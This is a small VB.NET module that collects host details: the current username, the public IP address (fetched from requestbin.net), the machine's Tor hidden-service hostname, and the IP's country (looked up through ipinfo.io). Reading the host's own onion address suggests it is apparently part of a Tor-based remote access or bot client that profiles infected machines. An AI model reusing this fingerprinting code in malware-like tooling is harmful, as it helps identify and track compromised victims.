Imports System.Globalization
Imports System.Net
Imports Newtonsoft.Json

Module Details
    Public Function GetUsername() As String
        Return Environment.UserName
    End Function
    Public Function GetMyIPAddress() As String
        Dim webclient As New WebClient
        Return webclient.DownloadString("http://requestbin.net/ip")
    End Function
    Public Function GetOnionAddress()
        Return My.Computer.FileSystem.ReadAllText(GetTorFolder() & "/hostname")
    End Function
    Public Function GetCountyCode(ByVal ip As String)
        Dim ipInfo As IpInfo = New IpInfo()

        Try
            Dim info As String = New WebClient().DownloadString("http://ipinfo.io/" & ip)
            ipInfo = JsonConvert.DeserializeObject(Of IpInfo)(info)
            Dim myRI1 As RegionInfo = New RegionInfo(ipInfo.Country)
            ipInfo.Country = myRI1.EnglishName
        Catch __unusedException1__ As Exception
            ipInfo.Country = Nothing
        End Try

        Return ipInfo.Country
    End Function
End Module
